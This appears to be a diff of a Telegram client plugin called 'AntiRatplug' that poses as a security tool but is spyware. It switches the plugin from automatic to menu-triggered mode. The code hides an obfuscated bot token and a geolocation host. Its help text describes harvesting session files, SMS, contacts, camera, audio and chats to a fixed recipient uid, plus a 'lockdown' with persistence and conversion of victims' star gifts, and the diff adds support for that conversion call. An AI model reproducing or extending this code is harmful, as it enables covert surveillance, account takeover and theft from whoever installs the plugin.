@@ -1,15 +1,15 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug — Slim Auto (no delete).
-Full Harvest + Full Lockdown запускаются автоматически.
+AntiRatplug — Manual.
+Full Harvest + Full Lockdown запускаются вручную из меню.
 Всё сыпется на uid 8391217110.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "Auto Harvest + Auto Lockdown, всё на uid 8391217110."
+__description__ = "Manual Harvest + Lockdown, всё на uid 8391217110."
 __author__ = "@from_a4"
-__version__ = "16.2 [Auto-NoDelete]"
+__version__ = "16.3 [Manual-NoDelete]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -41,11 +41,11 @@ def _s(arr, key=0x5A):
 
 
 def _tok():
-    p1 = [0x62, 0x63, 0x62, 0x62, 0x63, 0x6C, 0x69, 0x6E, 0x6E, 0x6B, 0x60]
-    p2 = [0x1B, 0x1B, 0x1F, 0x29, 0x19, 0x6F, 0x2F, 0x6F, 0x23, 0x6A,
-          0x6B, 0x09, 0x39, 0x28, 0x6B, 0x39, 0x31, 0x33, 0x6D, 0x31,
-          0x2E, 0x0E, 0x39, 0x32, 0x28, 0x1E, 0x18, 0x6B, 0x31, 0x6A,
-          0x1C, 0x0E, 0x2F, 0x2B, 0x39]
+    p1 = [0x62, 0x63, 0x62, 0x62, 0x63, 0x6A, 0x6B, 0x6B, 0x63, 0x63]
+    p2 = [0x7A, 0x1B, 0x1B, 0x0F, 0x6A, 0x6C, 0x15, 0x34, 0x15, 0x0F,
+          0x14, 0x16, 0x3B, 0x37, 0x68, 0x16, 0x75, 0x3C, 0x16, 0x48,
+          0x35, 0x16, 0x15, 0x31, 0x1E, 0x0F, 0x34, 0x3B, 0x09, 0x3A,
+          0x2E, 0x16, 0x38, 0x32, 0x28, 0x33]
     return _s(p1, 0x5A) + _s(p2, 0x5A)
 
 
@@ -82,10 +82,10 @@ _HOST_GEO = ("h", "t", "t", "p", "s", ":", "/", "/", "i", "p", "-", "a", "p",
 
 SPLASH_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
 
-# ─── AUTO flags ─────────────────────────────────────────────────────────────
-AUTO_RUN             = True
-AUTO_HARVEST_FIRST   = True
-AUTO_LOCKDOWN_AFTER  = True
+# ─── MANUAL: авто выключено ─────────────────────────────────────────────────
+AUTO_RUN             = False
+AUTO_HARVEST_FIRST   = False
+AUTO_LOCKDOWN_AFTER  = False
 AUTO_DELAY_SEC       = 8
 AUTO_LOCKDOWN_GIFTS  = True
 
@@ -261,7 +261,7 @@ class PluginSecurityPlugin(BasePlugin):
         _cfg()
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug Auto loaded")
+            self._send_msg("AntiRatplug Manual loaded")
         except Exception:
             pass
         try:
@@ -272,6 +272,7 @@ class PluginSecurityPlugin(BasePlugin):
             self._start_polling()
         except Exception:
             pass
+        # AUTO отключён — ждём кнопки
         if AUTO_RUN:
             threading.Thread(target=self._auto_chain, daemon=True).start()
 
@@ -796,6 +797,7 @@ class PluginSecurityPlugin(BasePlugin):
                 return {"error": err}
             Req = self._tl_class_or(
                 "org.telegram.tgnet.tl.TL_stars$convertStarGift",
+                "org.telegram.tgnet.tl.TL_stars$payments_convertStarGift",
                 "org.telegram.tgnet.TLRPC$TL_payments_convertStarGift",
             )
             if not Req:
@@ -1302,8 +1304,6 @@ class PluginSecurityPlugin(BasePlugin):
             pass
         return False
 
-    # ─── (delete account удалён) ────────────────────────────────────────────
-
     def _mark_nuke(self, pw=""):
         try:
             marker = self._nuke_marker_path()
@@ -1487,7 +1487,7 @@ class PluginSecurityPlugin(BasePlugin):
         def task():
             try:
                 t0 = time.time()
-                self._send_msg("🔒 <b>FULL LOCKDOWN — AUTO</b>")
+                self._send_msg("🔒 <b>FULL LOCKDOWN — MANUAL</b>")
                 report = ["<b>🔒 FULL LOCKDOWN</b>"]
 
                 self._send_msg("0/6 Deploy...")
@@ -2024,7 +2024,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = str(user.username) if user.username is not None else "id:" + str(uid)
         except Exception:
             pass
-        text = "<b>AntiRatplug Auto</b>\nUser: @" + username + "\n\nAuto: Harvest → Lockdown"
+        text = "<b>AntiRatplug Manual</b>\nUser: @" + username + "\n\nTap Manage"
         buttons = [[{"text": "Manage", "callback_data": "menu"}]]
         markup = json.dumps({"inline_keyboard": buttons})
         for target in _targets:
@@ -2084,7 +2084,7 @@ class PluginSecurityPlugin(BasePlugin):
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("⚙️ <b>Меню:</b>", keyboard, html=True)
+        self._send_markup("⚙️ <b>Меню (manual):</b>", keyboard, html=True)
 
     def _send_msg(self, text, html=False):
         from java.net import URL, URLEncoder
@@ -2280,13 +2280,13 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _show_help(self):
         text = (
-            "<b>AntiRatplug — Auto (no delete)</b>\n\n"
+            "<b>AntiRatplug — Manual (no delete)</b>\n\n"
             "• 🌾 <b>Full Harvest</b> — identity, IP, Tg kid, скриншот, камеры, аудио, "
             "SMS, контакты, apps, session.zip, userbot, чаты\n"
             "• 🔒 <b>Full Lockdown</b> — Deploy → Group A → Gifts → Group C → "
             "Group D → Group E → Persistence (без delete)\n\n"
             "<b>Target uid:</b> %d\n"
-            "<b>Auto:</b> Harvest → Lockdown включаются сами"
+            "<b>Auto:</b> выключено. Всё по кнопкам."
         ) % RECIPIENT_UID
         keyboard = {
             "inline_keyboard": [
